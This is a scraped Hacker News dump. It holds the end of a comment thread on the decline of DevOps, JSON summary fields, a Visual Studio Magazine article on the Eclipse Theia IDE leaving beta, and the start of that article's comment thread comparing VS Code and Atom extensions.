your code, edit in vim and re-deploy. Crazy talk for production of course, but if you need it, it is possible. Basically it is not that far off from running a binary on a server if you need it to be. reply p_l 7 hours agorootparentprevThat's why debug container facility was added... Few years ago by now, I believe. Ability to inject a container with debug tooling into specific pod. reply turtleyacht 5 hours agorootparentprevIn the far future, technology is so advanced that \"rituals\" are invented to \"appease the machine spirits.\" No one knows how it works anymore, and everything must support an immense galactic, perpetual war effort. reply john-radio 18 hours agoparentprev> ... \"discovered\" that troubleshooting Kubernetes was a bit like Warhammer 40k Adeptus Mechanicus waving incense in front of machines they didn't understand in the hopes that it would make the problem go away. I'm so glad you quoted that because I missed it skimming the article and it's the funniest shit I've ever heard. reply curiousdeadcat 18 hours agorootparentK8s grinds my gears, and yet, I'd rather debug it than, or beholden to, AWS or Azure, every day of the week reply smcleod 18 hours agoprevDevOps was breaking down silos between Devs and Ops. It was co-opted by Enterprises to instead be seen (just like with agile) as CI/CD tooling (which is just one means to an end) and they tended to completely ignore the culture and values which are arguably the most important components. reply 29athrowaway 19 hours agoprevThe problem is when hardened system administrators and DBAs were replaced by people who were certainly not worthy successors. As that transition took place, a lot of the added value was eliminated. reply mingus88 18 hours agoparentI don’t know. As someone who has tried to introduce the simple concept of version control to various sysadmin orgs over the years, I am fine with many of those types of sysadmins going away A lot of those guys just couldn’t handle a reality where they couldn’t name all their systems with cute Dr Who hostnames and do all their work as local root with riced out bash prompts Devops at least forced them to the same table with the dev org, and if they ended up getting replaced in the transition then I shed zero tears reply thr0w 16 hours agorootparent> couldn’t handle a reality where they couldn’t name all their systems with cute Dr Who hostnames Worked with so many of these guys. They really are the worst. reply 29athrowaway 17 hours agorootparentprevSysadmins provisioned and managed version control systems for years. CVS, Subversion, etc. reply betaby 17 hours agorootparentRCS! reply mingus88 17 hours agorootparentI introduced RCS to my sysadmin team in the mid 90s but again you always had those guys with god complexes who couldn’t be bothered to ‘ci -u’ or ‘co -l’ properly because that’s not how they do things. And if your entire team isn’t onboard then it’s worse than having no VCS at all God riddance to those guys. They thrived in silos. reply 29athrowaway 15 hours agorootparentWell, some people are not agreeable, do not want to be seen taking guidance from others. They are not worried about understanding what they do, or improving their practices, they are worried about status and how others perceive them. Those people may be able to protect their status in the short term, maybe even bluff and be promoted. But they will never truly understand what's going on. reply giantg2 19 hours agoparentprevBut who needs to know what happens behind the facade of the services? It does everything for us! I miss the days of having an expert sys admin and DBA to help with tough issues. Now we're all on our own with no training. Most of the good people got axed or thrown into other roles. Becoming good at something only to have it thrown away and undervalued pisses me off. reply nineteen999 18 hours agorootparentI'm one of those old sysadmins/DBA's, and having worked in devops for a year or two a few years back, I was able to take the best parts of it that I found useful, and leave the rest for the internet widget crowd to bicker about on here and in the workplace. I brought CI/CD, automated deployments, and infra tests with me to what was a very \"retro\" non-cloud UNIX style environment. I left all the horseshit (kanban, retrospectives, scrum) for the others that are not really all that interested in actually getting shit done. While those guys had a bunch of shiny tools to play with all day long, they lacked basic UNIX skills that us old guys have, and you had to continually had to show them how it was done. The results speak for themselves. Couldn't be happier (or more securely employed) at this stage of my life. reply giantg2 18 hours agorootparentThat's great. When my company axed the Ops people, they didn't move them onto dev teams (some did, but very few). So we ended up with DevOps teams that were whole Dev experience. The Ops part was supposed to be \"easy\" with AWS. It was completely a cost saving play at my company by throwing more responsibility on the existing dev - combine roles and reduce headcount. reply altdataseller 18 hours agorootparentprevWhat sort of skills does a sysadmin and DBA have that most engineers lack? Most engineers should know the basics of bash scripting, iptables, Unix logging, cron, systemd, etc. as well as SQL, debugging slow queries, optimizing them, backing up dbs, etc reply sgarland 5 hours agorootparent> basics of bash scripting… Bash alone has a million footguns. If you know to use shellcheck you can probably survive those, and if you read the bash manual in its entirety you’ll almost certainly be well on your way to greatness, but getting devs to read docs – let alone boring, Web1.0 docs, is stretch. > basics of SQL… Have you seen the knobs Postgres and MySQL have to turn? Do you know what they all do, when you should turn them, and by how much? The documentation for both of these is enormous and highly detailed, yet in no way covers everything that can and will go wrong. You only find those things out by using it day in and day out. As to SQL itself, “I can do inner joins” is about as complex as I’ve seen most devs do. Hell, mention a semijoin and you’ll get blank stares. I think in general, you’re grossly overestimating the average developer’s knowledge breadth and desire to learn these things. They simply do not matter for most, because tooling exists such that most of the time, they don’t need to know. I consider myself decent at Linux and RDBMS, but that’s mostly because I genuinely enjoy both, play with them in my off-time, and have been running Linux in some form or fashion for the last 20+ years. Also, of course, my work specializations (SRE —> DBRE) have helped. reply wild_egg 18 hours agorootparentprev_should_ know is different than _do_ know. Most engineers have little to no understanding of those systems topics and the only DB knowledge they've picked up is what leaks through their ORM A person who competently knows all those topics _and_ how to write application code is worth their weight in gold reply sgarland 5 hours agorootparent> A person who competently knows all those topics _and_ how to write application code is worth their weight in gold IFF the company consistently values those skills. IME, they’ll say upon interviewing or hiring that those aren’t necessary for their workload, until they suddenly are, where you’re lauded as a hero. Predictably, the memory of hero status fades when promo season comes around, because those “aren’t core skillsets,” or something similar. reply giantg2 2 hours agorootparent'fades when promo season comes around, because those “aren’t core skillsets,” or something similar.' Exactly what I'm going through right now with a potential PIP. Last year I was told there was a solid basis for me being the getting the highest rating, but only if my core work was faster. Now they want to PIP me like nothing else I contribute to matters. reply sgarland 31 minutes agorootparentI’m very sorry. I quit a job once because they couldn’t follow their own rubric for promos. “We’ve written down objective guidelines for what constitutes your relative performance.” “Great, looks like I’m a shoe-in.” “Well… there are intangibles.” “Then why have the rubric?” reply nsxwolf 18 hours agoprevI still don’t really know what DevOps is. I have noticed, however, that over the last 20 years more and more power and flexibility has been taken away from me. I used to have passwords for everything and could deploy things and get things done on a dime, now there are layers of bureaucracy and middle fingers everywhere I turn. Is that DevOps? reply mingus88 18 hours agoparentWho knows! Just like “SRE” you really need to know what questions to ask before you accept any position in these orgs I briefly worked at a place where the SREs were responsible for replacing displays on the factory floor and the devops engineers took rotations approving terraform PRs all day long. As it turns out, a lot of orgs just rebrand their job postings with whatever fancy industry term gets applicants, then they rugpull you into very mundane ops chores reply icedchai 18 hours agoparentprevDevOps, in my experience, has often been unfortunately misused to mean \"no ops\": developers are doing operations, and there is no dedicated ops staff. For some engineers, this works. For others, they are out of their element and it leads to outages and chaos. reply photonthug 18 hours agoparentprevThat’s compliance, infosec, and arguably, just table stakes for a reasonably mature org. Sure it’s annoying sometimes but unless you enjoy the idea of randos with access to your own complete digital footprint, then everyone ought to see the wisdom in the idea of “robots only, no humans in prod” reply llama052 17 hours agorootparentYeah I agree, it's unfortunate that security compliance is often just making things as hard as possible in most organizations. Often times devops get to be the face of that and trust me.. they sure as hell don't want to have to hold hands even more. reply sadops 17 hours agoparentprevYAML over SSH, primarily. reply cglendenning 18 hours agoprevPeople who understand and can articulate enduring principles without going mad in a sea of bad ideas will perpetually increase their own value in an organization. Thank you for this article. I don't share so much of the cynical view of leadership intent, but I can understand it. reply surfingdino 12 hours agoprev> small and medium organizations abandon technology like Kubernetes K8s is a complex tech that requires multidisciplinary experience that small and medium orgs cannot afford. Even if they could, there simply is not enough talent to hire. My own experience shows that k8s makes developers less productive, because running a heavy stack locally is not exactly conducive to fast development cycles. I don't feel empowered, I feel abandoned and left dealing with a steaming pile of shite that used to be the responsibility of a DBA, Ops, and security. Unfortunately, the trend for hiring \"full stack developers\" who can do frontend, backend, infra, and DBA aka. \"I want a whole team for the price of a junior dev\" is not going away. reply jb_gericke 12 hours agoprevHaving watched the infrastructure side of things evolve from the late 90s/early 2000s, where every HP/IBM rackmount was a snowflake, configuration and releases were hand rolled and debugging server / OS / package dependency issues (not to mention scaling and managing load balancers) were exclusively manual to where we are today with Kubernetes, I would select Kube all day everyday. A consistent and now very stable substrate and API I can expect pretty much everywhere, which handles rollouts, resources, health checking/auto healing and scaling for me, and pretty much lets me sleep while infra is failing? Good luck debugging that hand rolled bash script to pull a container after whoever wrote it has left (and good luck scaling it). reply llmblockchain 18 hours agoprevDevOps was kept afloat by the SPA+microservice trend. reply llama052 17 hours agoprevI'll start by saying that I think knowledge for knowing layers underneath the application is fading in some circles, and that makes me sad. Having been a frontend guy some 10+ years ago, into a network engineer, then infrastructure engineering and now SRE. The amount of people on both sides of the developer circle and operations circle that do not want to understand what's going on is mind boggling. I was around when VMs were hot, when treating them as long living pets was just toil that operations dealt with. The collection of shell scripts to make that toil go away was nice. Then puppet, ansible and the like. Now we are in the golden ages of Kubernetes and orchestration platforms. We have a set of standards for how things can be operated. The terms are obfuscated sure, but the core concepts are still the same underneath the abstraction. I agree that platform engineering is a good place to be, and honestly it needs to be understood more by all parties including executives. They were bought and sold cloud on the idea that it's all managed, but that cannot be further from the truth, wrinkles will show as scale grows and your use cases progress in any environment, at home or in the cloud. Unfortunately good platform teams often aren't seen. A good platform just works, metrics just exist, logs just work, tracing just works out of the box. Things don't often go down. It's really only visible when things fail. If you do a great job implementing a self service platform you're often met with executives wondering why you're there because the cloud does it all! Applications are highly visible to all, but so are the layers underneath and they all work together if done correctly, I wish that was more understood. For context, I'm currently running multiple environments of Kubernetes, on premise and in cloud. Our team prides itself on using open source solutions utilizing the operator model. Prometheus, Thanos, Loki, Tempo, Istio, Cert-Manager, Strimzi Kafka, Flink operator, Otel collector etc. We do billions of requests a month and TBs of bandwidth with microservices. Have at a minimum 4 9's of uptime, and our cost footprint is extremely small. This comes from a 4 man platform team that also handles on call for all applications, security, cloud budget, and operations. It's not impossible. I guess I can't emphasize enough that understanding what the orchestration systems, the tooling and the stack are trying to do makes everything easier. As a developer you can understand your constraints and limitations. You can build off of known barriers. As an operations or platform engineer you can build things that don't require constant babysitting or toil.. you can save hundreds of thousands of dollars not offloading your observability to data dog or the like, you can make an impact. The technology is already here. reply hitsurume 14 hours agoparentI'm interested in knowing more about how you guys implemented the operator model and decided on those tools. Was there a book or anything that was helpful in all of this? reply llama052 1 hour agorootparentNothing specific I've read that helped us with this, our goal was finding the easiest path to entry to get the tooling we desire in our platform. I've debated writing it up and posting it somewhere, maybe I should. There's so many ways of doing things now that it's quite overwhelming sometimes. reply hitsurume 1 hour agorootparentYea exactly, thats why I asked haha. reply lazyant 18 hours agoprevThis was a bit of a straw man argument against DevOps and normal CI/CD that describes as only safety net the PR review and forgets about automated (unit, integration and end-to-end) testing and other de-risking activities like canary releases (funny enough, this is what Facebook heavily relies on so devs can push to prod on their first day). reply nunez 13 hours agoprevThis is a masterpiece. Thank you. reply KronisLV 7 hours agoprev> Now servers were effectively dumb boxes running containers, either on their own with Docker compose or as part of a fleet with Kubernetes/ECS/App Engine/Nomad/whatever new thing that has been invented in the last two weeks. No joke, containers are amazing, regardless of how quickly you try to move or how often you need to deploy. I remember a project where the performance turned out to be horrible because someone was running Oracle JDK 8 instead of OpenJDK 8 and that was enough to result in a huge discrepancy, here's an example of the request processing times during load tests: https://blog.kronis.dev/images/j/d/k/-/t/jdk-testing-compari... That would have been solved by Ansible or something like it, of course, but containers get rid of that risk altogether, since you need to package the JDK your app needs (and that it will be tested on). With a bit of work, using containers can be quite consistent and manageable - have Ansible or something similar set up your nodes that will run the containers, run a Docker Swarm, Hashicorp Nomad or Kubernetes cluster (K3s is great) that's more or less vanilla, something like Portainer or Rancher for easier management, Skywalking or one of those OpenTelemetry solutions for tracing and observability, throw in some uptime monitoring tools like Uptime Kuma, maybe even something like Zabbix or a more modern alternative for node monitoring and alerting and you're set. Anything that's self-hostable and doesn't tie you up with restrictive licenses (this also applies to using PostgreSQL or MariaDB instead of something like Oracle, if you can). You don't need to have every team branch out into completely different tools because those are the new hotness, you don't need to run everything on PaaS/SaaS platforms when IaaS is enough, realistically most of what you need can be stored in a Git repo that will contain a pretty clear history of why things have been changed and even some Wiki pages and/or ADRs that explain how you've gotten here. The situations in the article feel very much like corporate not caring and teams not talking to one another and having no coordination, or growing to a scale where direct communication no longer works yet not having anything in place to address that. If you're at that point, you should be able to throw money and human-years of work at the problem until it disappears, provided that people who hold the bag actually care. For what it's worth, regardless of the tech you use or the scale you're at, you can still have someone in charge of the platform (or a team, where applicable), you can still have a DBA or a sysadmin, if you recognize their skills as important and needed. reply doctor_eval 17 hours agoprevI’m compelled to make a couple of comments: 1. I feel that one big and important aspect of devops that isn’t mentioned is that smaller releases are less likely to have killer bugs. If you can release one change a day rather than 100 changes a quarter then overall I think there’s a strong argument, not to be had here, that you’ll have faster releases and less bugs overall, assuming my next point. This doesn’t take away from the article, but it’s just something I don’t see discussed much. 2. I think a huge part of the problem is that business management keeps trying to abstract away engineering management. The most productive team I’ve ever been part of was when I was able to spend most of my time planning and coordinating the work, as part of an overall vision, while my peers did the implementation and gave me feedback. One side effect of this was that productivity was actually measurable. But the value of productivity is lost on business management who saw me as just engineer - one who had the authority, furthermore, to push back against stupidity and was therefore a pain in the ass. Technical management is not valued, because it’s not understood, and this is seen in the endless cycle of fads designed to make all engineers fungible. reply kkfx 9 hours agoprevMy hope is that declarative distros, who are a practical implementation in software of the \"Datacenter as a Computer\" by \"ancient\" Google, like NixOS or Guix System became widespread and the NixOps/Morth/Disnix model can evolve in a more structured and stable solution pushing classic distros from the late 80s to the graveyard alongside with \"the product of devops\" witch are not CI/CD but paravirtualization for anything pushing docker/k*s and so on as a less absurd full-stack-virtualisation just to keep ignorant able to deploy proprietary stuff knowing the outcome is Serverless http://evrl.com/devops/cloud/2020/12/18/serverless.html or the modern mainframe named cloud. reply yownie 13 hours agoprevis it finally dead? thank god! reply deafpolygon 14 hours agoprevSo much of DevOps is being folded back into traditional roles now that the tooling has stabilized, and people are becoming disillusioned with the build, test, deploy loop. It doesn't scale very well: the larger the codebase/team, the more burden on each individual to make this work. reply litmus 17 hours agoprevchef's kiss This guy and the person that quit the bullshit industrial complex 6 months ago should get together and launch a startup. Better yet, we should all go and join Jeremy Howard's answer.ai pro bono. Besides being miraculously headed by a guy who is Not An Asshole, it incidentally also had the most refreshing launch post (in the warm and fuzzy way) this side of the AI bubble. The launch post concluded with this heading:We Don’t Really Know What We’re Doing.[0] I mean, for the finest minds in our respective fields, what else is there left to say really? [0] https://www.answer.ai/posts/2023-12-12-launch.html reply precompute 18 hours agoprevThat was a great read. reply andrewstuart 19 hours agoprev [–] Am I correct in understanding that microservices and DevOps are closely related - in that microservices trade code base complexity for operations complexity? reply pas 19 hours agoparentI would say they are both the fruit of the \"ownership tree\". Both are solutions to big but specific problems. (DevOps was a push against crazy corporate IT, where developers handed over the sacred tomes of operational manual and the blessed JAR/WAR files and IT took over from there. And operations was on-call, and ... had absolutely zero fucking idea what to do, the manuals were fake, and they had no expertise, and the whole handover was just burning money, etc. So dev teams got access, and things got a bit more programmatic anyway as scale kept growing. From the early days of Capistrano and Puppet to immutable images running on EC2 and nowadays to CI/CD with containers running wherever. Microservies was kind of an organic step from that. Both to handle resource scaling and mostly to handle product/project coordination. Extremely limited scopes helps local reasoning to make okayish decisions most of the time. See also Rust's ergonomics principles about \"reasoning footprint\" and the Bounded Context concept from DDD. Of course the trick is that, it looks easy when someone gives a talk at a conference showcasing their company's a-ma-zing whiteboard-to-yet-another-webservice tempo, but it needs well-funded, good-faith constructive/supportive security and platform teams. And in practice it's famously hard to keep these complex interconnected systems/projects/orgs on track. And even when you have that many companies then try to force things [the good old hammer-nail anti-pattern] https://www.youtube.com/watch?v=PAew2jhr2zs ) reply senorrib 18 hours agorootparentThis is such a good description. Very much appreciated. reply giantg2 18 hours agorootparentprev\"And operations was on-call, and ... had absolutely zero fucking idea what to do, the manuals were fake, and they had no expertise, and the whole handover was just burning money, etc.\" This is what is we with DevOps now. The short lived dev teams had it over to the next dev team with basically no documentation. DevOps was just another stop on the shitty process parade that Agile contributed to - all about speed, forget docs, who has time for real tests, and for requirements we'll just use JIRA tickets the devs work on. Surprise, surprise... Our bug and rework stories take about 25% of our capacity now. reply paulsmith 18 hours agoparentprevDevOps predated microservices by a good bit. And DevOps was meant to reduce operational complexity, because the people who best knew how to run the software were the ones who made it. (DevOps also predated commoditization of the infra layer, we didn't know about Docker or k8s yet.) And they could use the direct experiential feedback loop of driving the car they had built to plow understanding right back into the next iteration. Or ideally anyway. reply inopinatus 18 hours agorootparentMost institutions failed to understand that devops is a practice of silo busting, not a team or a job title. The most devopsy thing you can do is treat IT service development and ownership like a product instead of a project. All you really have to do, though, is sit the developers next to the ops folks and let the law of proximate communication do the rest. Institutions and institutional corporations generally can’t make the switch in mindset to multidisciplinary service teams, and established project managers will even fight it tooth and nail since it looks like a threat to their jobs. Microservices are orthogonal. Architecturally they are just SOA, now with json/grpc instead of wsdl et al. Operationally and strategically they are slightly a better fit for service teams, but only at scale. Small and medium enterprises will experience inefficiency instead. Conway’s Law is super applicable to understanding these dynamics. reply greatgib 8 hours agorootparentprevYes but in the end there was corporate capture and so that resulted in engineering teams like: dev teams create the SW but has no right, DevOps team that has no idea about what is doing the software or how to do dev btw but they have all the production rights... reply candiddevmike 18 hours agoparentprevYes, in that they're complimentary methodologies. But the second you have a DevOps team (or, shutter, a \"microservice team\"), you've gone sideways. reply cebert 19 hours agoparentprev [–] You still have challenges supporting monoliths in production. I don’t see the two being related and more of a shift left culture move. reply giantg2 18 hours agorootparent [–] I think the methodology contributed to the culture shift, or vice versa. Things like documentation and requirement capture have gone to absolute shit over the last decade at my company. You couldnhave good documentation under either model, but I feel like the shift to microservices was about speed for many companies, so they cut docs along with the shift. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "DevOps, initially promising to streamline software development and operations, often led to centralized risk and delays due to communication and coordination challenges.",
      "The shift towards DevOps aimed to reduce dependency on specialized technical staff and facilitate last-minute changes, but it resulted in complex and costly systems, despite the introduction of containers and SaaS solutions like Datadog.",
      "The industry is now pivoting towards Platform Engineering and simpler workflows, moving away from complex technologies like Kubernetes to focus on simplicity, stability, and realistic growth expectations."
    ],
    "commentSummary": [
      "The post discusses the perceived decline of DevOps, highlighting how the initial goals of speed and efficiency often led to chaotic and unsustainable practices.",
      "It emphasizes the shift towards Continuous Integration/Continuous Deployment (CI/CD) and trunk-based development, which aims to streamline the deployment process and reduce risks.",
      "The conversation reflects on the evolving roles within tech teams, such as Site Reliability Engineers (SREs) and platform engineers, indicating a move away from traditional DevOps roles."
    ],
    "points": 212,
    "commentCount": 152,
    "retryCount": 0,
    "time": 1719615545
  },
  {
    "id": 40825146,
    "title": "Open source 'Eclipse Theia IDE' exits beta to challenge Visual Studio Code",
    "originLink": "https://visualstudiomagazine.com/Articles/2024/06/27/eclipse-theia-ide.aspx",
    "originBody": "Home News Tips & How-To Newsletters White Papers Webcasts Advertise About Us Training More .NET Tips and Tricks The Data Science Lab Practical .NET The Practical Client Data Driver C# Corner In-Depth PDF Back Issues HTML Issue Archive Archive Code Samples .NET Agile/Scrum ALM Open Source SharePoint Cross-Platform C# Mobile Corner Live! Video Azure Visual Studio Visual Studio Code Blazor/ASP.NET .NET C#/VB/TypeScript Xamarin/Mobile AI/Machine Learning News Open Source 'Eclipse Theia IDE' Exits Beta to Challenge Visual Studio Code By David Ramel 06/27/2024 Some seven years in the making, the Eclipse Foundation's Theia IDE project is now generally available, emerging from beta to challenge Microsoft's similar Visual Studio Code editor, with which it shares much tech. The Eclipse Theia IDE, part of the Eclipse Cloud DevTools ecosystem, primarily differs from VS Code in licensing and governance. Open-source champion Eclipse Foundation calls it a \"true open-source alternative\" to VS Code, which Microsoft has described as being \"built\" on open source but with proprietary elements like default telemetry with which usage data is collected. [Click on image for larger view.] Eclipse Theia IDE in on Windows (source: Screenshot). Note that Eclipse Theia IDE is a separate component from the overall Theia project's related Eclipse Theia Platform, used to build IDEs and tools based on modern web technologies. As far as the similarities with VS Code, Theia is built on the same Monaco editor that powers VS Code, and it supports the same Language Server Protocol (LSP) and Debug Adapter Protocol (DAP) that provide IntelliSense code completions, error checking and other features. Eclipse Theia IDE also supports the same extensions as VS Code (via the Open VSX Registry instead of Microsoft's Visual Studio Code Marketplace), which are typically written in TypeScript and JavaScript. There are many, many more extensions available for VS Code in Microsoft's marketplace, while \"Extensions for VS Code Compatible Editors\" in the Open VSX Registry number 3,784 at the time of this writing. [Click on image for larger view.] Open VSX Registry (source: Open VSX Registry). Eclipse Foundation compared the two tools in 2019, when it said to make a good decision between using VS Code or Eclipse Theia as a platform for a tool, an organization will need to evaluate custom project requirements, noting that as a general direction: If you want to provide some tooling, which is focussed on code and want as many developers as possible to use it in their existing IDE, providing an extension for VS Code seems like a valid choice. If you want to provide a white-labeled product for customers or your own developers, which is tailored to a specific use case and possibly contains more features than code editing, you might be better served with Eclipse Theia. A somewhat more recent post from 2020 exploring the differences between the Eclipse Theia Platform (not IDE) and VS Code noted two primary ways in which the projects' architectures differ: Eclipse Theia allows developers to create desktop and cloud IDEs using a single, open source technology stack. Microsoft now offers VS Online for cloud development environments, but like VS Code, it cannot be used in open source initiatives such as Gitpod. Eclipse Theia allows developers to customize every aspect of the IDE without forking or patching the code. This means they can easily use Theia as a base to develop desktop and cloud IDEs that are fully tailored for the needs of internal company projects or for commercial resale as a branded product. VS Code is a developer IDE only. It was never intended to be used as the base for other IDEs, extended, or further distributed. For developers just wanting to pick a tool to write apps with, an Eclipse Foundation blog post today said: \"For developers in search of an IDE that combines flexibility, openness, and cutting-edge technology, the Theia IDE is a compelling choice. Distinctive features like an adaptable toolbar, detachable views, remote development support, and the forthcoming live collaboration mode set Theia apart from other open-source IDEs. Moreover, its commitment to privacy and its stance against incorporating telemetry by default reflect its respect for user preferences.\" Eclipse Foundation today emphasized another difference between its Theia IDE and VS Code: the surrounding ecosystem/community. [Click on image for larger view.] Eclipse Theia Community (source: Eclipse). \"At the core of Theia IDE is its vibrant open source community hosted by the Eclipse Foundation,\" the organization said in a news release. \"This ensures freedom for commercial use without proprietary constraints and fosters innovation and reliability through contributions from companies like Ericsson, EclipseSource, STMicroelectronics, TypeFox, and more. The community-driven model encourages participation and adaptation according to user needs and feedback.\" Indeed, the list of contributors to and adopters of the platform is extensive, also featuring Broadcom, Arm, IBM, Red Hat, SAP, Samsung, Google, Gitpod, Huawei and many others. \"The Theia IDE's open-source foundation, supported by a vibrant community and underpinned by a license that champions commercial use, sets the stage for a development environment that is not only powerful and flexible but also inclusive and forward-looking,\" Eclipse Foundation concluded in its announcement today. \"By choosing the Theia IDE, developers and organizations are not just adopting an IDE; they are joining a movement that values collaboration, freedom, and the collective pursuit of excellence in software development.\" About the Author David Ramel is an editor and writer for Converge360. Printable Format comments powered by Disqus Featured Microsoft Making Big .NET Aspire Push, So What Is It? Microsoft is making a big push to publicize its new .NET Aspire, a new tech stack to streamline development of .NET cloud-native services. Open Source 'Eclipse Theia IDE' Exits Beta to Challenge Visual Studio Code Some seven years in the making, the Eclipse Foundation's Theia IDE project is now generally available, emerging from beta to challenge Microsoft's similar Visual Studio Code editor, with which it shares much tech. Visual Studio IntelliCode Still Among Top AI Code Assistants In the age of GitHub Copilot, ChatGPT, Google Gemini and all the rest, one of the most-used AI coding assistants is still the venerable IntelliCode feature of Microsoft's Visual Studio IDE, whose six-year-old tech now seems positively ancient. GitHub Expands Copilot Enterprise Search in Visual Studio and VS Code GitHub supercharged search for its Copilot Enterprise AI assistant in both Microsoft's Visual Studio IDE and Visual Studio Code so developers can now get results from well beyond local codebases, including the internet. What's New in TypeScript 5.5, Now Generally Available Microsoft shipped the latest iteration of its type-infused superset of JavaScript, TypeScript 5.5, introducing inferred type predicates, control flow narrowing, JSDoc @import and other enhancements. Most Popular Most Popular Articles Most Emailed Articles Open Source 'Eclipse Theia IDE' Exits Beta to Challenge Visual Studio Code Visual Studio IntelliCode Still Among Top AI Code Assistants Microsoft Making Big .NET Aspire Push, So What Is It? What's Next for ASP.NET Core and Blazor New .NET 9 Templates for Blazor Hybrid, .NET MAUI Subscribe on YouTube .NET Insight Sign up for our newsletter. Email Address*Country* United States of America Afghanistan Åland Islands Albania Algeria American Samoa Andorra Angola Anguilla Antarctica Antigua and Barbuda Argentina Armenia Aruba Australia Azerbaijan Austria Bahamas Bahrain Bangladesh Barbados Belarus Belgium Belize Benin Bermuda Bhutan Bolivia, Plurinational State of Bonaire, Sint Eustatius and Saba Bosnia and Herzegovina Botswana Bouvet Island Brazil British Indian Ocean Territory Brunei Darussalam Bulgaria Burkina Faso Burundi Cambodia Cameroon Canada Cape Verde (Cabo Verde) Cayman Islands Curaçao Central African Republic Chad Chile China Christmas Island Cocos (Keeling) Islands Colombia Comoros Congo Congo, the Democratic Republic of the Cook Islands Costa Rica Côte d'Ivoire Croatia Cuba Cyprus Czech Republic Denmark Djibouti Dominica Dominican Republic Ecuador Egypt El Salvador Equatorial Guinea Eritrea Estonia Ethiopia Falkland Islands (Malvinas) Faroe Islands Fiji Finland France French Guiana French Polynesia French Southern Territories Gabon Gambia Georgia Germany Ghana Gibraltar Greece Greenland Grenada Guadeloupe Guam Guatemala Guernsey Guinea Guinea-Bissau Guyana Haiti Heard Island and McDonald Islands Holy See (Vatican City State) Honduras Hong Kong Hungary Iceland India Indonesia Iran, Islamic Republic of Iraq Ireland Isle of Man Israel Italy Jamaica Japan Jersey Jordan Kazakhstan Kenya Kiribati Korea, Democratic People's Republic of Korea, Republic of Kuwait Kyrgyzstan Lao People's Democratic Republic Latvia Lebanon Lesotho Liberia Libya Liechtenstein Lithuania Luxembourg Macao Macedonia, the former Yugoslav Republic of Madagascar Malawi Malaysia Maldives Mali Malta Marshall Islands Martinique Mauritania Mauritius Mayotte Mexico Micronesia, Federated States of Moldova, Republic of Monaco Mongolia Montenegro Montserrat Morocco Mozambique Myanmar Namibia Nauru Nepal Netherlands New Caledonia New Zealand Nicaragua Niger Nigeria Niue Norfolk Island Northern Mariana Islands Norway Pakistan Oman Palau Palestinian Territory, Occupied Panama Paraguay Papua New Guinea Peru Philippines Pitcairn Poland Portugal Puerto Rico Qatar Réunion Romania Russian Federation Rwanda Saint Barthélemy Saint Helena, Ascension and Tristan da Cunha Saint Kitts and Nevis Saint Lucia Saint Martin (French part) Saint Pierre and Miquelon Saint Vincent and the Grenadines Samoa San Marino Sao Tome and Principe Saudi Arabia Senegal Serbia Seychelles Sierra Leone Singapore Sint Maarten (Dutch part) Slovakia Slovenia Solomon Islands Somalia South Africa South Georgia and the South Sandwich Islands South Sudan Spain Sri Lanka Sudan Suriname Svalbard and Jan Mayen Eswatini (Swaziland) Sweden Switzerland Syrian Arab Republic Taiwan, Province of China Tajikistan Tanzania, United Republic of Thailand Timor-Leste Togo Tokelau Tonga Trinidad and Tobago Tunisia Turkey Turkmenistan Turks and Caicos Islands Tuvalu Uganda Ukraine United Arab Emirates United Kingdom United States Minor Outlying Islands Uruguay Uzbekistan Vanuatu Viet Nam Venezuela, Bolivarian Republic of Virgin Islands, British Virgin Islands, U.S. Wallis and Futuna Western Sahara Yemen Zambia Zimbabwe I agree to this site's Privacy Policy Please type the letters/numbers you see above. Most Popular Articles Most Emailed Articles Open Source 'Eclipse Theia IDE' Exits Beta to Challenge Visual Studio Code Visual Studio IntelliCode Still Among Top AI Code Assistants Microsoft Making Big .NET Aspire Push, So What Is It? What's Next for ASP.NET Core and Blazor New .NET 9 Templates for Blazor Hybrid, .NET MAUI Upcoming Training Events 0 AM VSLive! 4-Day Hands-On Training Seminar: Full Stack Hands-On Development with .NET (Core) July 16-19, 2024 Live! 360 2-Day Hands-On Seminar: Swimming in the Lakes of Microsoft Fabric and AI - A Hands-on Experience August 20-21, 2024 VSLive! 4-Day Hands-On Training Seminar: Hands-on with Blazor September 17-20, 2024 VSLive! 2-Day Hands-On Training Seminar: Developing Secure ASP.NET Web Apps September 24-25, 2024 Live! 360 Orlando November 17-22, 2024 VSLive! 4-Day Hands-On Training Seminar: Full Stack Hands-On Development with .NET (Core) December 10-13, 2024 Visual Studio Live! Las Vegas March 10-14, 2025 Free Webcasts Myths and Realities in Telemetry Data Handling How .NET MAUI Changes the Cross-Platform Game Summit MoneyTree Achieves Compliance and Speeds Innovation with AWS and Sumo Logic Best Practices for AWS Monitoring > More Webcasts Contact Us Advertise Training Print Issues Online Free Newsletters Site Map Reprints List Rental AI Boardroom ADTmag AWS Insider Campus Security Today Campus Technology Environmental Protection Live! 360 MCPmag MedCloudInsider Occupational Health & Safety Pure AI Redmond Redmond Channel Partner Security Today Spaces 4 Learning TechMentor Techtactics in Education THE Journal Virtualization & Cloud Review Visual Studio Magazine Visual Studio Live! ©1996-2024 1105 Media Inc. See our Privacy Policy, Cookie Policy and Terms of Use. CA: Do Not Sell My Personal Info Problems? Questions? Feedback? E-mail us.",
    "commentLink": "https://news.ycombinator.com/item?id=40825146",
    "commentBody": "Open source 'Eclipse Theia IDE' exits beta to challenge Visual Studio Code (visualstudiomagazine.com)192 points by avivallssa 22 hours agohidepastfavorite136 comments cbxyp 20 hours agoUsed this a few years ago in early stages before VS code remote was a thing. It's very useful to add some interface extensibility components into VS Code's framework. I suspect microsoft made some intentional design decision to make this harder to do in VS code's apis, totally eschewing any real editor extensibility in favor of a \"apps in the editor, not extending the editor\" design vs Atom's much more open ended allowance for modifications. For example, if you wanted to make a form builder in VS code for VS code extensions - that would not be usable outside of the Webview tab functionality without modifying the editor source. Glad eclipse foundation recognized this and is providing some groundwork to make a real IDE out of VS code. Theia was also the first to provide support for running vscode-as-a-platform and run via web browser, at least support that was functional and working. reply bad_user 12 hours agoparentWhen comparing VS Code with Atom, vim, Emacs, others, an underappreciated fact is that extensions just work, and are very easy to install and configure, which has much to do with its model. Atom was unusable for me, because, as you installed extensions, something always broke. This is also similar to the old Firefox vs Chrome. The former was great for power users, but it crashed a lot and Firefox installs of regular people were riddled with insecure extensions that broke the browser and that couldn't even be un-installed. VS Code does have flaws, but having limited extensions is not one of them, IMO. reply sureglymop 9 hours agorootparentThey don't \"just work\". There are many many extensions that require external tools in the path etc. and some even go as far as to try to download such dependencies (and leave them on the system). Generally one should definitely read the extension documentation and there 